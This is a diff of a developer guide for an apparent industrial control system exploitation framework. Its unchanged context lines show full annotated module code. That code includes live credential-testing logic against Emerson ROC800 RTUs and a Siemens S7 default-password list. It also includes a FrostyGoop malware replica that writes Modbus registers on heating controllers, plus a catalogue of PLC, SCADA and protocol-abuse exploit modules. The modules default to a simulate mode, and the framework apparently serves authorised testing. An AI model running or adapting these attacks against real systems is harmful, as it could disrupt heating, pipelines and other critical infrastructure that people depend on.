@@ -15,7 +15,7 @@ This guide covers everything needed to write a new IXF module: the minimal templ
 7. [Full Annotated Credentials Module Example](#full-annotated-credentials-module-example)
 8. [Full Annotated Assessment / MITRE Module Example](#full-annotated-assessment--mitre-module-example)
 9. [Full Annotated Malware TTP Module Example](#full-annotated-malware-ttp-module-example)
-10. [check() Implementation — 5 Patterns](#check-implementation---5-patterns)
+10. [check() Implementation - 5 Patterns](#check-implementation---5-patterns)
 11. [run() Implementation Guide](#run-implementation-guide)
 12. [DestructiveGate.print\_simulation() Reference](#destructivegateprint_simulation-reference)
 13. [Adding Vendor-Specific Options](#adding-vendor-specific-options)
@@ -34,13 +34,13 @@ This guide covers everything needed to write a new IXF module: the minimal templ
 Copy this verbatim, then replace every `MODULE_NAME`, `CVE-YYYY-NNNNN`, and placeholder:
 
 ```python
-"""IXF MODULE_NAME — brief description. simulate=True default."""
-# Standard library — always available
+"""IXF MODULE_NAME - brief description. simulate=True default."""
+# Standard library - always available
 import socket
 
-# IXF core imports — all mandatory ones listed here
+# IXF core imports - all mandatory ones listed here
 from industrialxpl.core.exploit import (
-    Exploit,          # Base class — every module inherits this
+    Exploit,          # Base class - every module inherits this
     OptBool,          # Boolean option (True/False)
     OptIP,            # IP address option (validated)
     OptPort,          # Port option (1-65535)
@@ -50,7 +50,7 @@ from industrialxpl.core.exploit import (
     print_success,    # Green [+] message
     print_warning,    # Yellow[!] message
     print_info,       # Cyan  [i] message
-    DestructiveGate,  # Simulation gate — always call in simulate branch
+    DestructiveGate,  # Simulation gate - always call in simulate branch
 )
 
 
@@ -79,7 +79,7 @@ class Exploit(Exploit):              # Class MUST be named Exploit
 
     @mute                         # ALWAYS decorate check() with @mute
     def check(self) -> bool:
-        """Read-only connectivity probe — no side effects."""
+        """Read-only connectivity probe - no side effects."""
         if not self.target:       # Guard: target must be set
             return False
         try:
@@ -122,40 +122,40 @@ Place your module file in the correct directory. The path must exactly match the
 
 | Module Type | Directory Pattern | Example File |
 |-------------|------------------|-------------|
-| CVE exploit — any vendor | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
-| CVE exploit — Siemens | `cve/siemens/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2019_13945_scalance_auth_bypass.py` |
-| CVE exploit — Schneider | `cve/schneider/cve_YYYY_NNNNN_<desc>.py` | `cve/schneider/cve_2022_37300_ecostruxure_rce.py` |
-| CVE exploit — Rockwell | `cve/rockwell/cve_YYYY_NNNNN_<desc>.py` | `cve/rockwell/cve_2021_27478_logix_hardcoded.py` |
-| CVE exploit — Moxa | `cve/moxa/cve_YYYY_NNNNN_<desc>.py` | `cve/moxa/cve_2020_25159_mgmt_auth_bypass.py` |
-| CVE exploit — Emerson | `cve/emerson/cve_YYYY_NNNNN_<desc>.py` | `cve/emerson/cve_2022_29965_roc800_hardcoded.py` |
-| CVE exploit — GE | `cve/ge/cve_YYYY_NNNNN_<desc>.py` | `cve/ge/cve_2018_10952_cimplicity_rce.py` |
-| CVE exploit — Honeywell | `cve/honeywell/cve_YYYY_NNNNN_<desc>.py` | `cve/honeywell/cve_2021_37740_experion_dos.py` |
-| CVE exploit — ABB | `cve/abb/cve_YYYY_NNNNN_<desc>.py` | `cve/abb/cve_2019_7232_pb610_hardcoded.py` |
-| CVE exploit — other | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/omron/cve_2022_31206_fins_overflow.py` |
-| Protocol abuse — Modbus | `exploits/protocols/modbus/<name>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
-| Protocol abuse — DNP3 | `exploits/protocols/dnp3/<name>.py` | `exploits/protocols/dnp3/dnp3_unsolicited_flood.py` |
-| Protocol abuse — IEC 104 | `exploits/protocols/iec104/<name>.py` | `exploits/protocols/iec104/iec104_startdt_flood.py` |
-| Protocol abuse — S7comm | `exploits/protocols/s7comm/<name>.py` | `exploits/protocols/s7comm/s7_cpu_stop.py` |
-| Protocol abuse — EtherNet/IP | `exploits/protocols/ethernetip/<name>.py` | `exploits/protocols/ethernetip/enip_list_identity.py` |
-| Protocol abuse — BACnet | `exploits/protocols/bacnet/<name>.py` | `exploits/protocols/bacnet/bacnet_who_is_flood.py` |
-| Protocol abuse — OPC UA | `exploits/protocols/opcua/<name>.py` | `exploits/protocols/opcua/opcua_anonymous_browse.py` |
-| PLC exploit — Siemens | `exploits/plc/siemens/<name>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
-| PLC exploit — Rockwell | `exploits/plc/rockwell/<name>.py` | `exploits/plc/rockwell/logix_unauth_read.py` |
+| CVE exploit - any vendor | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
+| CVE exploit - Siemens | `cve/siemens/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2019_13945_scalance_auth_bypass.py` |
+| CVE exploit - Schneider | `cve/schneider/cve_YYYY_NNNNN_<desc>.py` | `cve/schneider/cve_2022_37300_ecostruxure_rce.py` |
+| CVE exploit - Rockwell | `cve/rockwell/cve_YYYY_NNNNN_<desc>.py` | `cve/rockwell/cve_2021_27478_logix_hardcoded.py` |
+| CVE exploit - Moxa | `cve/moxa/cve_YYYY_NNNNN_<desc>.py` | `cve/moxa/cve_2020_25159_mgmt_auth_bypass.py` |
+| CVE exploit - Emerson | `cve/emerson/cve_YYYY_NNNNN_<desc>.py` | `cve/emerson/cve_2022_29965_roc800_hardcoded.py` |
+| CVE exploit - GE | `cve/ge/cve_YYYY_NNNNN_<desc>.py` | `cve/ge/cve_2018_10952_cimplicity_rce.py` |
+| CVE exploit - Honeywell | `cve/honeywell/cve_YYYY_NNNNN_<desc>.py` | `cve/honeywell/cve_2021_37740_experion_dos.py` |
+| CVE exploit - ABB | `cve/abb/cve_YYYY_NNNNN_<desc>.py` | `cve/abb/cve_2019_7232_pb610_hardcoded.py` |
+| CVE exploit - other | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/omron/cve_2022_31206_fins_overflow.py` |
+| Protocol abuse - Modbus | `exploits/protocols/modbus/<name>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
+| Protocol abuse - DNP3 | `exploits/protocols/dnp3/<name>.py` | `exploits/protocols/dnp3/dnp3_unsolicited_flood.py` |
+| Protocol abuse - IEC 104 | `exploits/protocols/iec104/<name>.py` | `exploits/protocols/iec104/iec104_startdt_flood.py` |
+| Protocol abuse - S7comm | `exploits/protocols/s7comm/<name>.py` | `exploits/protocols/s7comm/s7_cpu_stop.py` |
+| Protocol abuse - EtherNet/IP | `exploits/protocols/ethernetip/<name>.py` | `exploits/protocols/ethernetip/enip_list_identity.py` |
+| Protocol abuse - BACnet | `exploits/protocols/bacnet/<name>.py` | `exploits/protocols/bacnet/bacnet_who_is_flood.py` |
+| Protocol abuse - OPC UA | `exploits/protocols/opcua/<name>.py` | `exploits/protocols/opcua/opcua_anonymous_browse.py` |
+| PLC exploit - Siemens | `exploits/plc/siemens/<name>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
+| PLC exploit - Rockwell | `exploits/plc/rockwell/<name>.py` | `exploits/plc/rockwell/logix_unauth_read.py` |
 | SCADA exploit | `exploits/scada/<vendor>/<name>.py` | `exploits/scada/schneider/citect_scada_odbc_rce.py` |
 | HMI exploit | `exploits/hmi/<vendor>/<name>.py` | `exploits/hmi/siemens/wincc_traversal.py` |
 | ICS Scanner | `scanners/ics/<protocol>_scan.py` | `scanners/ics/modbus_detect.py` |
 | Network Scanner | `scanners/network/<name>.py` | `scanners/network/ot_port_sweep.py` |
 | Default credentials | `creds/<vendor>/<protocol>_default_creds.py` | `creds/siemens/ssh_default_creds.py` |
-| Default credentials — generic | `creds/generic/<protocol>_default_creds.py` | `creds/generic/web_default_creds.py` |
+| Default credentials - generic | `creds/generic/<protocol>_default_creds.py` | `creds/generic/web_default_creds.py` |
 | Malware TTP | `cve/malware/<name>.py` | `cve/malware/frostygoop_modbus_heating.py` |
 | APT TTP | `cve/apt/<name>.py` | `cve/apt/industroyer2_iec104_rtu.py` |
-| Assessment — IEC 62443 | `assessment/iec62443/<name>.py` | `assessment/iec62443/zone_conduit_audit.py` |
-| Assessment — NIST | `assessment/nist_sp800_82/<name>.py` | `assessment/nist_sp800_82/control_checklist.py` |
-| Assessment — MITRE ICS | `assessment/mitre_ics/t<NNNN>_<tactic_name>.py` | `assessment/mitre_ics/t0843_program_upload.py` |
-| Assessment — Risk | `assessment/risk/<name>.py` | `assessment/risk/ics_risk_scorer.py` |
-| Assessment — IR | `assessment/ir/<name>.py` | `assessment/ir/iacs_ir_playbook.py` |
-| Assessment — Protocol | `assessment/protocols/<name>.py` | `assessment/protocols/opcua_security_audit.py` |
-| Assessment — Network | `assessment/network/<name>.py` | `assessment/network/ics_firewall_audit.py` |
+| Assessment - IEC 62443 | `assessment/iec62443/<name>.py` | `assessment/iec62443/zone_conduit_audit.py` |
+| Assessment - NIST | `assessment/nist_sp800_82/<name>.py` | `assessment/nist_sp800_82/control_checklist.py` |
+| Assessment - MITRE ICS | `assessment/mitre_ics/t<NNNN>_<tactic_name>.py` | `assessment/mitre_ics/t0843_program_upload.py` |
+| Assessment - Risk | `assessment/risk/<name>.py` | `assessment/risk/ics_risk_scorer.py` |
+| Assessment - IR | `assessment/ir/<name>.py` | `assessment/ir/iacs_ir_playbook.py` |
+| Assessment - Protocol | `assessment/protocols/<name>.py` | `assessment/protocols/opcua_security_audit.py` |
+| Assessment - Network | `assessment/network/<name>.py` | `assessment/network/ics_firewall_audit.py` |
 
 **Create `__init__.py` in every new directory:**
 
@@ -188,11 +188,11 @@ Every module must define `__info__` as a class-level dictionary. All keys are re
 | `authors` | `tuple[str, ...]` | Tuple of strings | Your handle(s). Format: `"Real Name (handle)"` |
 | `references` | `tuple[str, ...]` | URLs | Official advisories (CISA, NVD, vendor), PoC repos. Must be public URLs. |
 | `devices` | `tuple[str, ...]` | Strings | Affected device descriptions: `"Vendor Model Series"` |
-| `impact` | `str` | See table below | Operational impact level — choose the highest applicable. |
+| `impact` | `str` | See table below | Operational impact level - choose the highest applicable. |
 | `exploit_type` | `str` | See table below | Short category label for the attack technique. |
 | `source_poc` | `str` | URL or `"IXF native"` | Link to original public PoC, or `"IXF native"` if built from scratch. |
 | `cve` | `str` | `"CVE-YYYY-NNNNN"` or `"N/A"` | CVE identifier. Use `"N/A"` for undisclosed or advisory-only findings. |
-| `cvss` | `str` | `"0.0"–"10.0"` or `"N/A"` | CVSS v3 base score as string. Use `"N/A"` if no score assigned. |
+| `cvss` | `str` | `"0.0"-"10.0"` or `"N/A"` | CVSS v3 base score as string. Use `"N/A"` if no score assigned. |
 | `severity` | `str` | See impact table | Mirrors the `impact` field label. Keep them consistent. |
 | `mitre_techniques` | `list[str]` | `["T0NNN", ...]` | MITRE ATT&CK for ICS technique IDs. See `ixf mitre-list` for valid values. |
 | `mitre_tactics` | `list[str]` | Tactic name strings | Tactic names corresponding to the listed techniques. |
@@ -236,7 +236,7 @@ Inhibit Response Function    Impair Process Control       Impact
 
 IXF provides 10 option types as class-level descriptors. Declare them as class attributes, not inside `__init__`.
 
-### OptIP — IP address
+### OptIP - IP address
 
 ```python
 from industrialxpl.core.exploit import OptIP
@@ -248,7 +248,7 @@ target = OptIP("", "Target device IP address")
 # Usage: self.target → "192.168.1.100" or ""
 ```
 
-### OptPort — TCP/UDP port
+### OptPort - TCP/UDP port
 
 ```python
 from industrialxpl.core.exploit import OptPort
@@ -261,7 +261,7 @@ dnp3    = OptPort(20000, "DNP3 port (default: 20000)")
 # Usage: self.port → 502 (int)
 ```
 
-### OptBool — Boolean flag
+### OptBool - Boolean flag
 
 ```python
 from industrialxpl.core.exploit import OptBool
@@ -274,7 +274,7 @@ verbose     = OptBool(False, "Enable verbose output")
 # Usage: self.simulate → True or False
 ```
 
-### OptString — Arbitrary string
+### OptString - Arbitrary string
 
 ```python
 from industrialxpl.core.exploit import OptString
@@ -287,7 +287,7 @@ output    = OptString("",       "Output file path (empty = stdout)")
 # Usage: self.username → "admin"
 ```
 
-### OptInteger — Integer value
+### OptInteger - Integer value
 
 ```python
 from industrialxpl.core.exploit import OptInteger
@@ -302,7 +302,7 @@ reg_count= OptInteger(10,   "Number of registers to read",min_value=1,   max_val
 # Usage: self.unit_id → 1 (int)
 ```
 
-### OptFloat — Floating point value
+### OptFloat - Floating point value
 
 ```python
 from industrialxpl.core.exploit import OptFloat
@@ -313,7 +313,7 @@ timeout = OptFloat(3.0, "Socket timeout (seconds)",        min_value=0.1, max_va
 # Usage: self.delay → 0.5 (float)
 ```
 
-### OptCIDR — CIDR network range
+### OptCIDR - CIDR network range
 
 ```python
 from industrialxpl.core.exploit import OptCIDR
@@ -326,7 +326,7 @@ subnet  = OptCIDR("10.0.0.0/8",     "OT network range")
 # Iterate: import ipaddress; list(ipaddress.ip_network(self.network).hosts())
 ```
 
-### OptList — Comma-separated list
+### OptList - Comma-separated list
 
 ```python
 from industrialxpl.core.exploit import OptList
@@ -337,7 +337,7 @@ protocols = OptList("modbus,s7,dnp3", "Protocols to probe")
 # Usage: self.ports → ["80", "443", "8080"] (list of strings)
 ```
 
-### OptFile — File path
+### OptFile - File path
 
 ```python
 from industrialxpl.core.exploit import OptFile
@@ -350,7 +350,7 @@ targets  = OptFile("", "Path to targets file (one IP per line)")
 # Read: Path(self.wordlist).read_text().splitlines()
 ```
 
-### OptChoice — Enumerated choices
+### OptChoice - Enumerated choices
 
 ```python
 from industrialxpl.core.exploit import OptChoice
@@ -370,12 +370,12 @@ fc       = OptChoice("04",   ["01", "02", "03", "04", "0F", "10"], "Modbus funct
 This example is exhaustively commented. Every design decision is explained.
 
 ```python
-"""IXF CVE-2022-29965 — Emerson ROC800 RTU Hardcoded Credentials.
+"""IXF CVE-2022-29965 - Emerson ROC800 RTU Hardcoded Credentials.
 
 Module docstring: one-liner sentence + blank line + CVSS/CWE + affected + description.
 
 CVSS: 9.8 (CRITICAL) | CWE: CWE-798 (Use of Hard-coded Credentials)
-Affected: Emerson ROC800 Series RTU — all firmware versions
+Affected: Emerson ROC800 Series RTU - all firmware versions
 Fix: No vendor patch as of advisory. Network isolation required.
 
 Emerson ROC800 Series RTUs contain hardcoded credentials that allow full ROC+
@@ -391,7 +391,7 @@ import struct
 
 # --- IXF core imports --- import only what you use
 from industrialxpl.core.exploit import (
-    Exploit,        # Base class — required
+    Exploit,        # Base class - required
     OptBool,        # simulate and destructive flags
     OptIP,          # validated IP input
     OptPort,        # validated port input
@@ -403,13 +403,13 @@ from industrialxpl.core.exploit import (
     print_status,   # [*] status/progress messages
     print_success,  # [+] findings and successful hits
     print_warning,  # [!] non-fatal warnings
-    print_table,    # tabular output — (headers, rows, title)
-    DestructiveGate,# simulation gate — always call in simulate branch
+    print_table,    # tabular output - (headers, rows, title)
+    DestructiveGate,# simulation gate - always call in simulate branch
 )
 
 
 class Exploit(Exploit):
-    # Class MUST be named Exploit — the loader searches for this exact name.
+    # Class MUST be named Exploit - the loader searches for this exact name.
     # __info__ MUST be a class-level dictionary (not an instance attribute).
 
     __info__ = {
@@ -446,7 +446,7 @@ class Exploit(Exploit):
         ),
 
         # impact: choose the HIGHEST applicable level.
-        # ROC800 controls pipeline flow — CRITICAL is correct.
+        # ROC800 controls pipeline flow - CRITICAL is correct.
         "impact": "CRITICAL",
 
         # exploit_type: a short category label (see canonical list in __info__ guide).
@@ -473,7 +473,7 @@ class Exploit(Exploit):
     }
 
     # --- Class-level option descriptors ---
-    # Declare as class attributes. Do not use self.options["key"] — access via self.key.
+    # Declare as class attributes. Do not use self.options["key"] - access via self.key.
 
     target = OptIP(
         "",                              # Default: empty (unset)
@@ -490,12 +490,12 @@ class Exploit(Exploit):
         max_value=60,
     )
     simulate = OptBool(
-        True,                            # ALWAYS default True — this is mandatory
-        "Simulate mode — no live traffic (default: True)",
+        True,                            # ALWAYS default True - this is mandatory
+        "Simulate mode - no live traffic (default: True)",
     )
     destructive = OptBool(
         False,                           # ALWAYS default False
-        "Enable live exploitation — requires written authorization",
+        "Enable live exploitation - requires written authorization",
     )
 
     # Module-level constant: hardcoded credentials from the public advisory.
@@ -507,9 +507,9 @@ class Exploit(Exploit):
     ]
 
     @mute  # @mute suppresses all print_* calls inside this method.
-    # This is MANDATORY for check() — it must be silent when called from `autocheck`.
+    # This is MANDATORY for check() - it must be silent when called from `autocheck`.
     def check(self) -> bool:
-        """Read-only connectivity probe — TCP connect only, no data sent.
+        """Read-only connectivity probe - TCP connect only, no data sent.
 
         Returns True if the target is reachable on the ROC+ port.
         check() must NEVER send exploit payloads or modify device state.
@@ -570,7 +570,7 @@ class Exploit(Exploit):
             # Additional informational messages after simulation block
             print_info("Advisory: https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03")
             print_info("Hardcoded creds: admin/ROC800 | operator/op | empty/empty")
-            return  # ALWAYS return after simulation — do not fall through to live code
+            return  # ALWAYS return after simulation - do not fall through to live code
 
         # --- Live exploit code (runs only when simulate=False) ---
         print_status("[CVE-2022-29965] Testing {} credential set(s) against {}:{}".format(
@@ -585,7 +585,7 @@ class Exploit(Exploit):
                 s.settimeout(self.timeout)
                 s.connect((self.target, self.port))
 
-                # ROC+ authentication frame — simplified from public protocol docs.
+                # ROC+ authentication frame - simplified from public protocol docs.
                 # Format: [opcode:1B][subcode:1B][username:16B][password:16B]
                 auth_frame = struct.pack(
                     ">BB16s16s",
@@ -614,7 +614,7 @@ class Exploit(Exploit):
             except socket.timeout:
                 results.append((username or "(empty)", password or "(empty)", "TIMEOUT"))
             except ConnectionRefusedError:
-                print_error("Connection refused — target not reachable on port {}".format(self.port))
+                print_error("Connection refused - target not reachable on port {}".format(self.port))
                 break  # No point continuing if the port is closed
             except Exception as e:
                 results.append((
@@ -628,7 +628,7 @@ class Exploit(Exploit):
             print_table(
                 ["Username", "Password", "Result"],  # Column headers
                 results,                               # List of (col1, col2, col3) tuples
-                title="ROC800 Credential Test — {}:{}".format(self.target, self.port),
+                title="ROC800 Credential Test - {}:{}".format(self.target, self.port),
             )
 
         # Summary
@@ -645,7 +645,7 @@ class Exploit(Exploit):
 ## Full Annotated Scanner Module Example
 
 ```python
-"""IXF Modbus TCP Device Scanner — detect and fingerprint Modbus TCP devices.
+"""IXF Modbus TCP Device Scanner - detect and fingerprint Modbus TCP devices.
 
 Sends a Modbus FC04 (Read Input Registers) probe and validates the Transaction
 ID echo in the response. Optionally reads device identification via FC43/MEI.
@@ -760,7 +760,7 @@ class Exploit(Exploit):
                     "Step 3: Validate Transaction ID echo in 6-byte MBAP response\n"
                     "Step 4: If identify=True, send FC43/MEI (Object IDs 0x00-0x02)\n"
                     "        Extract: VendorName, ProductCode, MajorMinorRevision\n"
-                    "Impact: Device fingerprinted — vendor, model, firmware revision known"
+                    "Impact: Device fingerprinted - vendor, model, firmware revision known"
                 ).format(self.target, self.port, self._FC04_PROBE.hex()),
                 mitre_techniques=["T0888", "T0802"],
             )
@@ -797,7 +797,7 @@ class Exploit(Exploit):
 ## Full Annotated Credentials Module Example
 
 ```python
-"""IXF Siemens S7 Default Credentials — common default passwords for S7 PLC web/FTP.
+"""IXF Siemens S7 Default Credentials - common default passwords for S7 PLC web/FTP.
 
 Tests default credentials for the Siemens SIMATIC S7-300/400/1200/1500 web server
 and FTP interface. These devices often ship with blank or well-known passwords.
@@ -819,7 +819,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "Siemens S7 Default Credentials — Web / FTP",
+        "name":             "Siemens S7 Default Credentials - Web / FTP",
         "description": (
             "Tests common default and factory-reset credentials against Siemens "
             "SIMATIC S7 PLC web server (HTTP port 80) and FTP interface (port 21). "
@@ -856,7 +856,7 @@ class Exploit(Exploit):
     # Default credentials sourced from vendor documentation and CISA advisories.
     # Format: (username, password)
     DEFAULT_CREDS: List[Tuple[str, str]] = [
-        ("admin",   ""),         # Factory default — blank password
+        ("admin",   ""),         # Factory default - blank password
         ("admin",   "admin"),    # Common reset
         ("admin",   "siemens"),  # Vendor default
         ("",        ""),         # Anonymous / no auth
@@ -930,7 +930,7 @@ class Exploit(Exploit):
                     "  admin / (blank) | admin / admin | admin / siemens\n"
                     "  (blank) / (blank) | user / user | Anon / (blank)\n"
                     "\n"
-                    "Impact: Full PLC web interface access — read ladder logic,\n"
+                    "Impact: Full PLC web interface access - read ladder logic,\n"
                     "        download/upload programs, change CPU operating mode"
                 ).format(self.target, self.service, len(self.DEFAULT_CREDS)),
                 mitre_techniques=["T0859"],
@@ -960,7 +960,7 @@ class Exploit(Exploit):
             print_table(
                 ["Username", "Password", "Result"],
                 results,
-                title=f"{svc_name} Credential Test — {self.target}:{svc_port}",
+                title=f"{svc_name} Credential Test - {self.target}:{svc_port}",
             )
 ```
 
@@ -969,9 +969,9 @@ class Exploit(Exploit):
 ## Full Annotated Assessment / MITRE Module Example
 
 ```python
-"""IXF MITRE T0843 — Program Upload assessment module.
+"""IXF MITRE T0843 - Program Upload assessment module.
 
-T0843: Program Upload — adversaries upload PLC programs to identify logic
+T0843: Program Upload - adversaries upload PLC programs to identify logic
 or use device as exfiltration vector. Maps to Collection tactic.
 
 simulate=True always. Assessment modules never modify target state.
@@ -985,7 +985,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "MITRE T0843 Program Upload — PLC Logic Exfiltration Assessment",
+        "name":             "MITRE T0843 Program Upload - PLC Logic Exfiltration Assessment",
         "description": (
             "Assessment module for MITRE ATT&CK for ICS technique T0843 (Program Upload). "
             "Evaluates detection and prevention controls against unauthorized PLC program "
@@ -1008,10 +1008,10 @@ class Exploit(Exploit):
         "mitre_tactics":    ["Collection"],
     }
 
-    target   = OptIP("",   "Target PLC IP (optional — used for connectivity check)")
+    target   = OptIP("",   "Target PLC IP (optional - used for connectivity check)")
     port     = OptPort(102, "S7comm port for connectivity probe (default: 102)")
     simulate = OptBool(True, "Simulate mode (always True for assessment modules)")
-    destructive = OptBool(False, "No live action — assessment only")
+    destructive = OptBool(False, "No live action - assessment only")
 
     @mute
     def check(self) -> bool:
@@ -1029,10 +1029,10 @@ class Exploit(Exploit):
             return False
 
     def run(self) -> None:
-        # Assessment modules always print simulation — they never send live traffic.
+        # Assessment modules always print simulation - they never send live traffic.
         DestructiveGate.print_simulation(
             description=(
-                "T0843 Program Upload — Attack Scenario\n\n"
+                "T0843 Program Upload - Attack Scenario\n\n"
                 "Stage 1: Discovery\n"
                 "  Adversary scans for S7comm (TCP/102), EtherNet/IP (TCP/44818),\n"
                 "  or Modbus (TCP/502) to enumerate accessible PLCs.\n\n"
@@ -1084,7 +1084,7 @@ class Exploit(Exploit):
 ## Full Annotated Malware TTP Module Example
 
 ```python
-"""IXF FrostyGoop Modbus Heating Attack — Malware TTP Replica.
+"""IXF FrostyGoop Modbus Heating Attack - Malware TTP Replica.
 
 FrostyGoop (BUSTLEBERM) was used in January 2024 to attack Lviv, Ukraine
 district heating infrastructure. The malware sent Modbus write commands to
@@ -1111,7 +1111,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "FrostyGoop Modbus Heating Attack — Malware TTP Replica",
+        "name":             "FrostyGoop Modbus Heating Attack - Malware TTP Replica",
         "description": (
             "Replicates FrostyGoop (BUSTLEBERM) malware behavior: sends Modbus FC16 "
             "(Write Multiple Registers) commands to ENCO heating controllers to force "
@@ -1147,7 +1147,7 @@ class Exploit(Exploit):
     repeat      = OptInteger(1, "Number of times to repeat the write command", min_value=1, max_value=100)
     delay       = OptFloat(1.0, "Delay between repeat writes (seconds)", min_value=0.1, max_value=60.0)
     simulate    = OptBool(True,  "Simulate mode (default: True)")
-    destructive = OptBool(False, "Enable live Modbus FC16 writes — WILL affect heating systems")
+    destructive = OptBool(False, "Enable live Modbus FC16 writes - WILL affect heating systems")
 
     @mute
     def check(self) -> bool:
@@ -1185,9 +1185,9 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "FrostyGoop Malware TTP Replica — Modbus Heating Attack\n\n"
+                    "FrostyGoop Malware TTP Replica - Modbus Heating Attack\n\n"
                     "Attack history:\n"
-                    "  January 2024 — Sandworm group deploys FrostyGoop (BUSTLEBERM)\n"
+                    "  January 2024 - Sandworm group deploys FrostyGoop (BUSTLEBERM)\n"
                     "  against Lvivteploenergo district heating utility in Lviv, Ukraine.\n"
                     "  600 apartment buildings lose heat. Temperatures below freezing.\n\n"
                     "Step 1: Identify ENCO controllers on Modbus TCP/502\n"
@@ -1213,7 +1213,7 @@ class Exploit(Exploit):
             print_info("Source: https://www.dragos.com/blog/frostygoop-ics-malware/")
             return
 
-        print_warning("[FrostyGoop] LIVE MODE — sending Modbus FC16 writes to {}:{}".format(
+        print_warning("[FrostyGoop] LIVE MODE - sending Modbus FC16 writes to {}:{}".format(
             self.target, self.port))
 
         results = []
@@ -1245,20 +1245,20 @@ class Exploit(Exploit):
             print_table(
                 ["Write#", "Register", "Value", "Result"],
                 results,
-                title="FrostyGoop FC16 Write Results — {}:{}".format(self.target, self.port),
+                title="FrostyGoop FC16 Write Results - {}:{}".format(self.target, self.port),
             )
 ```
 
 ---
 
-## check() Implementation — 5 Patterns
+## check() Implementation - 5 Patterns
 
 ### Pattern 1: TCP Connect (most common)
 
 ```python
 @mute
 def check(self) -> bool:
-    """TCP connect probe — port open = target reachable."""
+    """TCP connect probe - port open = target reachable."""
     if not self.target:
         return False
     try:
@@ -1276,7 +1276,7 @@ def check(self) -> bool:
 ```python
 @mute
 def check(self) -> bool:
-    """UDP probe — send and wait for any response within timeout."""
+    """UDP probe - send and wait for any response within timeout."""
     if not self.target:
         return False
     try:
@@ -1299,7 +1299,7 @@ def check(self) -> bool:
 ```python
 @mute
 def check(self) -> bool:
-    """HTTP HEAD request — check if web interface is accessible."""
+    """HTTP HEAD request - check if web interface is accessible."""
     if not self.target:
         return False
     try:
@@ -1353,7 +1353,7 @@ def check(self) -> bool:
 ```python
 @mute
 def check(self) -> bool:
-    """Assessment module — always returns True (no connectivity required)."""
+    """Assessment module - always returns True (no connectivity required)."""
     # Assessment modules provide methodology and checklists.
     # They do not require connectivity to run.
     return True
@@ -1405,7 +1405,7 @@ def run(self) -> None:
 if self.simulate:
     DestructiveGate.print_simulation(
         description=(
-            "CVE-YYYY-NNNNN Vendor Product — Module Name\n\n"
+            "CVE-YYYY-NNNNN Vendor Product - Module Name\n\n"
             "Step 1: {describe step 1}\n"
             "Step 2: {describe step 2}\n"
             "Step 3: {describe expected outcome}\n\n"
@@ -1439,7 +1439,7 @@ DestructiveGate.print_simulation(
 **Output format (what the user sees):**
 
 ```
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   ─────────────────────────────────────────────────────────────
   [i] What would happen:
 
@@ -1463,7 +1463,7 @@ DestructiveGate.print_simulation(
 | `mitre_techniques` | Yes | - | List of ICS technique IDs: `["T0836", "T0855"]`. Must match `__info__["mitre_techniques"]`. |
 | `impact` | No | from `__info__` | Override only when module impact differs from default. |
 | `cve` | No | from `__info__` | Override when simulating a different CVE than the module default. |
-| `header` | No | `"SIMULATE MODE — no packets sent"` | Override for assessment modules. |
+| `header` | No | `"SIMULATE MODE - no packets sent"` | Override for assessment modules. |
 
 **Best practices:**
 
@@ -1488,7 +1488,7 @@ class Exploit(Exploit):
     simulate = OptBool(True, "Simulate mode")
     destructive = OptBool(False, "Enable live exploitation")
 
-    # Vendor-specific options — add after standard options
+    # Vendor-specific options - add after standard options
     rack    = OptInteger(0, "S7 CPU rack number (default: 0)", min_value=0, max_value=7)
     slot    = OptInteger(1, "S7 CPU slot number (default: 1)", min_value=0, max_value=31)
     cpu_type = OptChoice("1200", ["300", "400", "1200", "1500"], "Target S7 CPU series")
@@ -1522,7 +1522,7 @@ from industrialxpl.core.exploit import mute
 
 @mute
 def check(self) -> bool:
-    # print_* calls here are silenced — no output to console
+    # print_* calls here are silenced - no output to console
     print_status("This will NOT appear")
     return True
 ```
@@ -1557,7 +1557,7 @@ def run(self) -> None:
 To scan a subnet or list of hosts, use `OptCIDR` with the `@multi` decorator:
 
 ```python
-"""IXF Multi-Target Modbus Scanner — scan a CIDR range for Modbus TCP devices."""
+"""IXF Multi-Target Modbus Scanner - scan a CIDR range for Modbus TCP devices."""
 import socket
 import struct
 import ipaddress
@@ -1597,7 +1597,7 @@ class Exploit(Exploit):
 
     @mute
     def check(self) -> bool:
-        return True  # Always True — range scanning does not use check()
+        return True  # Always True - range scanning does not use check()
 
     def _probe_host(self, host: str) -> tuple:
         """Probe a single host. Returns (host, is_modbus)."""
@@ -1737,7 +1737,7 @@ Impact:   CRITICAL
 check():  False
 
 --- run() output (simulate mode) ---
-  [SIMULATE MODE — no packets sent]
+  [SIMULATE MODE - no packets sent]
   ─────────────────────────────────────────────────────────────
   [i] What would happen:
       ...
@@ -1976,7 +1976,7 @@ obj.target = '1.2.3.4'
 buf = io.StringIO()
 with contextlib.redirect_stdout(buf):
     result = obj.check()
-assert buf.getvalue() == '', 'check() produced output — @mute missing or broken'
+assert buf.getvalue() == '', 'check() produced output - @mute missing or broken'
 print('check() is silent. Result:', result)
 "
 ```
@@ -1990,7 +1990,7 @@ Save this as `.tmp/gen_module.py` to scaffold new modules:
 {% raw %}
 ```python
 #!/usr/bin/env python3
-"""IXF Module Template Generator — creates a new module skeleton.
+"""IXF Module Template Generator - creates a new module skeleton.
 
 Usage:
     python .tmp/gen_module.py --cve CVE-2024-12345 --vendor siemens \
@@ -2007,7 +2007,7 @@ import re
 import sys
